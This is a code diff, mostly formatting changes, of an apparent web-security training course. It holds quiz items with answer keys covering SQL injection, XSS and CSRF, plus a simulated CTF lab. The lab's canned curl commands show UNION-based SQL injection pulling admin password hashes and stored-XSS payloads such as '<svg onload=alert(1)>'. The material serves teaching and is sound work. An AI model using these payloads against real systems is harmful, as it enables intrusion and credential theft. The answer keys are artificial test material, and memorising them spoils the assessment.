@@ -35,7 +35,7 @@ const unit5: Unit = {
             "A relational database stores data in TABLES — think spreadsheets with named columns. A `users` table might have columns `id`, `username`, `password_hash`, `role`, and one ROW per user.",
             "`SELECT column1, column2 FROM table WHERE condition` reads rows: SELECT says which columns to return, FROM says which table, WHERE filters which rows (e.g. `WHERE id = 5` returns only the row where id equals 5).",
             "A typical login checks a submitted username/password by building a query from user input, like: `SELECT * FROM users WHERE username = 'alice' AND password = 'hunter2'`. The quotes mark where a text value starts and ends — exactly like `{{name}}` in the mail-merge example.",
-            "Crucially: the web app usually builds this query by gluing strings together. If `alice` above was typed by the visitor, and the app does `\"SELECT * FROM users WHERE username = '\" + input + \"'\"`, then whatever the visitor types becomes part of the SQL *text*, not just a value plugged into a fixed slot.",
+            'Crucially: the web app usually builds this query by gluing strings together. If `alice` above was typed by the visitor, and the app does `"SELECT * FROM users WHERE username = \'" + input + "\'"`, then whatever the visitor types becomes part of the SQL *text*, not just a value plugged into a fixed slot.',
           ],
           code: `// A naive login query, built with string concatenation:
 query = "SELECT * FROM users WHERE username = '" + input + "' AND password = '" + pass + "'"
@@ -116,7 +116,8 @@ Numeric parameters (no surrounding quotes in the query) use the same idea withou
             q: "You try `ORDER BY 3` and get an error, but `ORDER BY 2` was fine. How many columns does the query return?",
             answers: ["2", "two"],
             hints: ["The error means column 3 doesn't exist.", "The last ORDER BY that worked tells you the count."],
-            explain: "ORDER BY N fails once N exceeds the number of columns, so the last successful N is the column count — here, 2.",
+            explain:
+              "ORDER BY N fails once N exceeds the number of columns, so the last successful N is the column count — here, 2.",
           },
         },
         {
@@ -160,7 +161,8 @@ Numeric parameters (no surrounding quotes in the query) use the same idea withou
               "Response time differences are the signature of time-based blind testing, not relevant here.",
               "Black-box behavioural evidence like this is exactly how confirmation works without source access.",
             ],
-            explain: "The key reasoning move: if a WAF or input filter were simply blocking 'weird' input, it would block both payloads equally since both contain non-numeric characters. Only a real SQL evaluation explains why true vs false diverge.",
+            explain:
+              "The key reasoning move: if a WAF or input filter were simply blocking 'weird' input, it would block both payloads equally since both contain non-numeric characters. Only a real SQL evaluation explains why true vs false diverge.",
           },
         },
         {
@@ -187,16 +189,25 @@ Numeric parameters (no surrounding quotes in the query) use the same idea withou
             "Time-based relies on a measured delay (e.g. SLEEP), not content differences.",
             "Second-order SQLi means the payload is stored and triggers later elsewhere — not what's described.",
           ],
-          hints: ["No errors are mentioned, so rule out plain error-based detection.", "Nothing about timing is mentioned either.", "What's left when you have true/false content differences but no errors or timing?"],
-          explain: "Different content (not error codes, not timing) between a logically-true and logically-false injected condition is the signature of boolean blind SQLi.",
+          hints: [
+            "No errors are mentioned, so rule out plain error-based detection.",
+            "Nothing about timing is mentioned either.",
+            "What's left when you have true/false content differences but no errors or timing?",
+          ],
+          explain:
+            "Different content (not error codes, not timing) between a logically-true and logically-false injected condition is the signature of boolean blind SQLi.",
         },
         {
           type: "fill",
           ref: "Extraction once confirmed: UNION",
           q: "What clause do you increment (ORDER BY 1, 2, 3...) to find the number of columns in the original query before using UNION SELECT?",
           answers: ["order by", "order-by", "orderby"],
-          hints: ["It's a normal SQL sorting clause, repurposed here.", "You increase the column number until it errors."],
-          explain: "ORDER BY N sorts by the Nth column; once N exceeds the real column count it errors, so the last working N is the count your UNION SELECT must match.",
+          hints: [
+            "It's a normal SQL sorting clause, repurposed here.",
+            "You increase the column number until it errors.",
+          ],
+          explain:
+            "ORDER BY N sorts by the Nth column; once N exceeds the real column count it errors, so the last working N is the count your UNION SELECT must match.",
         },
         {
           type: "mc",
@@ -215,8 +226,12 @@ Numeric parameters (no surrounding quotes in the query) use the same idea withou
             "Too vague to be reproducible; triagers need exact requests to verify.",
             "Brute-forcing every table is noisy, unnecessary for proof, and may be against program rules.",
           ],
-          hints: ["Think about the minimum evidence needed to prove the capability.", "What's the risk of touching real user data?"],
-          explain: "Prove the capability with innocuous output (DB version/current user) and the exact request — enough for a triager to reproduce without you having accessed sensitive data.",
+          hints: [
+            "Think about the minimum evidence needed to prove the capability.",
+            "What's the risk of touching real user data?",
+          ],
+          explain:
+            "Prove the capability with innocuous output (DB version/current user) and the exact request — enough for a triager to reproduce without you having accessed sensitive data.",
         },
         {
           type: "order",
@@ -228,13 +243,18 @@ Numeric parameters (no surrounding quotes in the query) use the same idea withou
             "Send a logically-true payload (e.g. ' AND '1'='1) and compare to baseline",
             "Send a logically-false payload (e.g. ' AND '1'='2) and confirm the response changes",
           ],
-          hints: ["You always need a baseline to compare against.", "A raw quote test comes before the boolean pair.", "True should look like baseline; false should differ."],
-          explain: "Baseline first (know 'normal'), then a quote to find a candidate, then the true/false pair to prove the parameter controls SQL logic rather than just causing an error.",
+          hints: [
+            "You always need a baseline to compare against.",
+            "A raw quote test comes before the boolean pair.",
+            "True should look like baseline; false should differ.",
+          ],
+          explain:
+            "Baseline first (know 'normal'), then a quote to find a candidate, then the true/false pair to prove the parameter controls SQL logic rather than just causing an error.",
         },
         {
           type: "mc",
           ref: "Prerequisite: how a web app talks to a database",
-          q: "An app builds a query as `\"SELECT * FROM items WHERE name = '\" + input + \"'\"`. Why is a quote character in `input` dangerous here?",
+          q: 'An app builds a query as `"SELECT * FROM items WHERE name = \'" + input + "\'"`. Why is a quote character in `input` dangerous here?',
           options: [
             "Quotes are never allowed in HTTP requests",
             "The quote prematurely ends the string literal, so everything after it is parsed as SQL code instead of data",
@@ -248,8 +268,12 @@ Numeric parameters (no surrounding quotes in the query) use the same idea withou
             "A syntax error affects that one query/request, not the whole machine.",
             "There is no automatic alert built into SQL — that depends on separate monitoring the app may or may not have.",
           ],
-          hints: ["Think about where a string literal in SQL starts and ends.", "What happens to the text that comes after the closing quote?"],
-          explain: "Because the app glued raw input straight into the query text, a quote in that input closes the string early and the remainder is read as SQL code — the core mechanism of injection.",
+          hints: [
+            "Think about where a string literal in SQL starts and ends.",
+            "What happens to the text that comes after the closing quote?",
+          ],
+          explain:
+            "Because the app glued raw input straight into the query text, a quote in that input closes the string early and the remainder is read as SQL code — the core mechanism of injection.",
         },
       ],
     },
@@ -283,7 +307,7 @@ Numeric parameters (no surrounding quotes in the query) use the same idea withou
             "'Neutralising' means HTML-ENCODING special characters before inserting user text into HTML: turning `<` into `&lt;`, `>` into `&gt;`, `\"` into `&quot;`. Encoded this way, a browser displays the literal characters `<script>` instead of treating them as a tag.",
           ],
           code: `// Page template, unsafe:
-<p>Welcome, ` + name + `</p>
+<p>Welcome, " + name + "</p>
 
 // If a visitor sets name = <script>alert(1)</script>, the final HTML the browser receives is:
 <p>Welcome, <script>alert(1)</script></p>
@@ -308,7 +332,8 @@ Numeric parameters (no surrounding quotes in the query) use the same idea withou
               "Nothing is deleted; the characters are still shown to the user, just not executed.",
               "This is standard, current behaviour in every modern browser.",
             ],
-            explain: "HTML encoding doesn't hide or remove anything — it changes a character's role from 'markup' to 'content', so the parser never treats it as the start of a tag.",
+            explain:
+              "HTML encoding doesn't hide or remove anything — it changes a character's role from 'markup' to 'content', so the parser never treats it as the start of a tag.",
           },
         },
         {
@@ -360,7 +385,8 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
               "It IS a meaningful lead worth following up, just not a confirmed vulnerability yet.",
               "This is an HTML/JS context issue, unrelated to SQL.",
             ],
-            explain: "Mirror the SQLi lesson's lesson: an error or unusual behaviour is a LEAD. Confirmation requires demonstrating the actual impact — here, that means proving the browser executes injected JavaScript.",
+            explain:
+              "Mirror the SQLi lesson's lesson: an error or unusual behaviour is a LEAD. Confirmation requires demonstrating the actual impact — here, that means proving the browser executes injected JavaScript.",
           },
         },
         {
@@ -402,7 +428,8 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
               "The tag choice (svg vs script) doesn't determine the family — it's about where the data is held and who triggers it.",
               "HTTPS is unrelated to whether a script executes once rendered.",
             ],
-            explain: "Stored XSS is defined by persistence: once saved, it fires for any visitor who views that content later, with no link-clicking or re-submission required from them.",
+            explain:
+              "Stored XSS is defined by persistence: once saved, it fires for any visitor who views that content later, with no link-clicking or re-submission required from them.",
           },
         },
         {
@@ -422,12 +449,23 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
           ref: "The three families, and why the distinction matters",
           q: "Match each XSS family to its defining characteristic.",
           pairs: [
-            ["Reflected", "Payload is in the request and echoed back in that same response; needs a victim to click a crafted link"],
+            [
+              "Reflected",
+              "Payload is in the request and echoed back in that same response; needs a victim to click a crafted link",
+            ],
             ["Stored", "Payload is saved server-side and later rendered to other visitors automatically"],
-            ["DOM", "Payload (often in the URL fragment) is read and unsafely written to the page by client-side JavaScript; may never reach the server"],
+            [
+              "DOM",
+              "Payload (often in the URL fragment) is read and unsafely written to the page by client-side JavaScript; may never reach the server",
+            ],
           ],
-          hints: ["Which one needs the victim to click something?", "Which one affects every later visitor without any trick?", "Which one can avoid the server entirely?"],
-          explain: "Reflected needs a crafted link per victim; stored persists and hits everyone; DOM can be entirely client-side, sometimes invisible server-side.",
+          hints: [
+            "Which one needs the victim to click something?",
+            "Which one affects every later visitor without any trick?",
+            "Which one can avoid the server entirely?",
+          ],
+          explain:
+            "Reflected needs a crafted link per victim; stored persists and hits everyone; DOM can be entirely client-side, sometimes invisible server-side.",
         },
         {
           type: "mc",
@@ -447,7 +485,8 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
             "Domain purchase is irrelevant to basic confirmation.",
           ],
           hints: ["What's the difference between 'text appeared' and 'code ran'?"],
-          explain: "Confirmation requires a payload that demonstrably executes (e.g. triggers alert()), not just unescaped text in the page source.",
+          explain:
+            "Confirmation requires a payload that demonstrably executes (e.g. triggers alert()), not just unescaped text in the page source.",
         },
         {
           type: "mc",
@@ -461,16 +500,24 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
             "Correct — `#fragment` text is never transmitted to the server; a client-side script must be reading it and writing it unsafely to the page, which is the definition of DOM XSS.",
             "SQLi is a different bug class entirely, about databases, not browsers.",
           ],
-          hints: ["Recall which part of a URL the browser never sends to the server.", "If the server never saw it, where did the unsafe handling happen?"],
-          explain: "The URL fragment (after #) stays entirely client-side. A payload that fires from there, with no server-side trace, must be handled unsafely by client-side JavaScript — DOM XSS.",
+          hints: [
+            "Recall which part of a URL the browser never sends to the server.",
+            "If the server never saw it, where did the unsafe handling happen?",
+          ],
+          explain:
+            "The URL fragment (after #) stays entirely client-side. A payload that fires from there, with no server-side trace, must be handled unsafely by client-side JavaScript — DOM XSS.",
         },
         {
           type: "fill",
           ref: "Prerequisite: how a browser parses a page",
           q: "What is it called when special HTML characters like `<` are converted to safe equivalents like `&lt;` before being inserted into a page?",
           answers: ["html encoding", "output encoding", "encoding", "html entity encoding", "escaping"],
-          hints: ["It changes how the parser interprets a character, from markup to literal text.", "The term describes 'making output safe for its context'."],
-          explain: "HTML (output) encoding converts characters with special meaning in HTML into literal, inert equivalents, so user text is displayed rather than parsed as markup or code.",
+          hints: [
+            "It changes how the parser interprets a character, from markup to literal text.",
+            "The term describes 'making output safe for its context'.",
+          ],
+          explain:
+            "HTML (output) encoding converts characters with special meaning in HTML into literal, inert equivalents, so user text is displayed rather than parsed as markup or code.",
         },
         {
           type: "mc",
@@ -490,7 +537,8 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
             "HTTPS protects data in transit; it has no bearing on whether input is safely encoded into HTML.",
           ],
           hints: ["Is CSP a root-cause fix, or a mitigation layered on top?"],
-          explain: "CSP restricts where scripts can execute from, reducing impact for many XSS payloads, but bypasses exist and the real fix is still proper output encoding at the source.",
+          explain:
+            "CSP restricts where scripts can execute from, reducing impact for many XSS payloads, but bypasses exist and the real fix is still proper output encoding at the source.",
         },
       ],
     },
@@ -551,7 +599,7 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
           kind: "example",
           title: "Worked example: spotting where it still works",
           body: [
-            "You find an endpoint `GET /account/delete?confirm=yes` — a state-changing action (deleting an account) accepted via GET. Because GET requests can be triggered just by loading an image tag (`<img src=\"https://victim.example/account/delete?confirm=yes\">`) on an attacker page, and GET requests are NOT blocked by SameSite=Lax's cross-site-POST restriction, this is exploitable even with modern cookie defaults.",
+            'You find an endpoint `GET /account/delete?confirm=yes` — a state-changing action (deleting an account) accepted via GET. Because GET requests can be triggered just by loading an image tag (`<img src="https://victim.example/account/delete?confirm=yes">`) on an attacker page, and GET requests are NOT blocked by SameSite=Lax\'s cross-site-POST restriction, this is exploitable even with modern cookie defaults.',
             "You also find a POST endpoint that reads its body as `Content-Type: text/plain` and has no CSRF token. Because `text/plain` is one of the 'simple' content types browsers allow to be set cross-site without a CORS preflight, an attacker's auto-submitting form can still trigger it (assuming SameSite isn't set to Strict and no token is required).",
           ],
         },
@@ -585,7 +633,8 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
               "Lax is a middle ground — it blocks cross-site POST but allows top-level GET, by design.",
               "Only the GET-triggerable one remains forgeable under Lax here; POST is blocked.",
             ],
-            explain: "SameSite=Lax specifically carves out an exception for top-level GET navigations (so that, e.g. clicking a shared link still shows you logged in) — which means a GET-based state change is still forgeable, while a cross-site POST is blocked.",
+            explain:
+              "SameSite=Lax specifically carves out an exception for top-level GET navigations (so that, e.g. clicking a shared link still shows you logged in) — which means a GET-based state change is still forgeable, while a cross-site POST is blocked.",
           },
         },
         {
@@ -616,8 +665,12 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
             "SameSite is unrelated to the HTTP vs HTTPS distinction.",
             "Lax is a real, default-on protection against the classic cross-site POST CSRF pattern.",
           ],
-          hints: ["Lax carves out one exception for usability — what is it?", "What kind of request does the classic CSRF form example use?"],
-          explain: "SameSite=Lax allows cookies on top-level cross-site GET navigation (so shared links still work) but withholds them on cross-site POST, breaking the classic CSRF form-auto-submit pattern.",
+          hints: [
+            "Lax carves out one exception for usability — what is it?",
+            "What kind of request does the classic CSRF form example use?",
+          ],
+          explain:
+            "SameSite=Lax allows cookies on top-level cross-site GET navigation (so shared links still work) but withholds them on cross-site POST, breaking the classic CSRF form-auto-submit pattern.",
         },
         {
           type: "mc",
@@ -636,16 +689,24 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
             "Encryption (HTTPS) is unrelated to the HTTP method used.",
             "GET is specifically risky here because state-changing actions shouldn't be idempotent/side-effect-free the way GET implies.",
           ],
-          hints: ["Recall Unit 4: GET is supposed to be used for idempotent, read-only actions.", "What's the Lax carve-out again?"],
-          explain: "Combining a side-effecting action with GET (which is trivially triggerable via an image tag or link, and still gets cookies under Lax) is a classic CSRF-enabling mistake.",
+          hints: [
+            "Recall Unit 4: GET is supposed to be used for idempotent, read-only actions.",
+            "What's the Lax carve-out again?",
+          ],
+          explain:
+            "Combining a side-effecting action with GET (which is trivially triggerable via an image tag or link, and still gets cookies under Lax) is a classic CSRF-enabling mistake.",
         },
         {
           type: "fill",
           ref: "Why it often fails today",
           q: "Besides SameSite cookies, what is the other common server-side defense that puts a random, unguessable value in each legitimate form, checked on submission?",
           answers: ["csrf token", "anti-csrf token", "token", "csrf-token"],
-          hints: ["It's something the attacker's forged form can't read due to the same-origin policy.", "It's checked alongside the cookie on submission."],
-          explain: "A CSRF token is a random value embedded in the legitimate form and verified server-side; an attacker's cross-origin forged form cannot read or guess it due to the same-origin policy.",
+          hints: [
+            "It's something the attacker's forged form can't read due to the same-origin policy.",
+            "It's checked alongside the cookie on submission.",
+          ],
+          explain:
+            "A CSRF token is a random value embedded in the legitimate form and verified server-side; an attacker's cross-origin forged form cannot read or guess it due to the same-origin policy.",
         },
         {
           type: "mc",
@@ -664,8 +725,11 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
             "Both affect any browser-based client, not specifically mobile.",
             "Neither vulnerability class is inherently tied to database presence.",
           ],
-          hints: ["Does CSRF require running any attacker JavaScript inside the victim's browser session for the target site?"],
-          explain: "CSRF exploits the browser's automatic credential attachment to forge a cross-site request; it needs no script execution in the target's origin, unlike XSS.",
+          hints: [
+            "Does CSRF require running any attacker JavaScript inside the victim's browser session for the target site?",
+          ],
+          explain:
+            "CSRF exploits the browser's automatic credential attachment to forge a cross-site request; it needs no script execution in the target's origin, unlike XSS.",
         },
       ],
     },
@@ -684,35 +748,32 @@ javascript:alert(1)              (used where input lands inside href= or src=)`,
       commands: {
         "curl 'https://shop.example/search?q=book'":
           "<h2>Results for 'book'</h2>\n<li>Book 1 — $12.00</li>\n<li>Book 2 — $19.00</li>",
-        "curl \"https://shop.example/search?q=book'\"":
+        'curl "https://shop.example/search?q=book\'"':
           "<h2>Results for 'book''</h2>\n<pre>SQLSTATE[42000]: Syntax error near 'book'' at line 1\nQuery: SELECT title,price FROM items WHERE title LIKE '%book'%'</pre>",
-        "curl \"https://shop.example/search?q=book' UNION SELECT NULL,NULL-- -\"":
+        'curl "https://shop.example/search?q=book\' UNION SELECT NULL,NULL-- -"':
           "<h2>Results for 'book' UNION SELECT NULL,NULL-- -'</h2>\n(no rows)",
-        "curl \"https://shop.example/search?q=book' UNION SELECT version(),current_user()-- -\"":
+        'curl "https://shop.example/search?q=book\' UNION SELECT version(),current_user()-- -"':
           "<h2>Results</h2>\n<li>MySQL 5.7.42 — shop_app@localhost</li>",
-        "curl \"https://shop.example/search?q=x' UNION SELECT table_name,NULL FROM information_schema.tables-- -\"":
+        'curl "https://shop.example/search?q=x\' UNION SELECT table_name,NULL FROM information_schema.tables-- -"':
           "<h2>Results</h2>\n<li>items</li>\n<li>users</li>\n<li>sessions</li>\n<li>flags</li>",
         "curl \"https://shop.example/search?q=x' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -\"":
           "<h2>Results</h2>\n<li>id</li>\n<li>username</li>\n<li>password_hash</li>\n<li>role</li>",
         "curl \"https://shop.example/search?q=x' UNION SELECT username,password_hash FROM users WHERE role='admin'-- -\"":
           "<h2>Results</h2>\n<li>admin — $2b$12$FLAG{un10n_based_sql1_still_pays_in_2026}.rest.of.hash</li>",
-        "curl 'https://shop.example/comments?post=1'":
-          "<article>Great product! — <b>charlie</b></article>",
-        "curl 'https://shop.example/comments?post=1' -d 'text=<x1x2x3>'":
-          "stored. GET /comments?post=1 to view.",
+        "curl 'https://shop.example/comments?post=1'": "<article>Great product! — <b>charlie</b></article>",
+        "curl 'https://shop.example/comments?post=1' -d 'text=<x1x2x3>'": "stored. GET /comments?post=1 to view.",
         "curl 'https://shop.example/comments?post=1'  # after storing <x1x2x3>":
           "<article>Great product! — <b>charlie</b></article>\n<article><x1x2x3> — <b>you</b></article>  <-- reflected unescaped",
-        "curl 'https://shop.example/comments?post=1' -d 'text=<svg onload=alert(1)>'":
-          "stored.",
+        "curl 'https://shop.example/comments?post=1' -d 'text=<svg onload=alert(1)>'": "stored.",
         "curl 'https://shop.example/comments?post=1'  # after storing SVG":
           "<article>Great product! — <b>charlie</b></article>\n<article><svg onload=alert(1)> — <b>you</b></article>  (would fire in a real browser)",
         "curl 'https://shop.example/comments/flag'":
-          "{\"note\":\"stored XSS owners get the flag\",\"flag\":\"FLAG{st0red_xss_pwns_every_reader}\"}",
+          '{"note":"stored XSS owners get the flag","flag":"FLAG{st0red_xss_pwns_every_reader}"}',
       },
       hints: [
         "curl 'https://shop.example/search?q=book'",
-        "curl \"https://shop.example/search?q=book'\"",
-        "curl \"https://shop.example/search?q=book' UNION SELECT version(),current_user()-- -\"",
+        'curl "https://shop.example/search?q=book\'"',
+        'curl "https://shop.example/search?q=book\' UNION SELECT version(),current_user()-- -"',
         "curl \"https://shop.example/search?q=x' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -\"",
         "curl \"https://shop.example/search?q=x' UNION SELECT username,password_hash FROM users WHERE role='admin'-- -\"",
         "curl 'https://shop.example/comments?post=1' -d 'text=<svg onload=alert(1)>'",
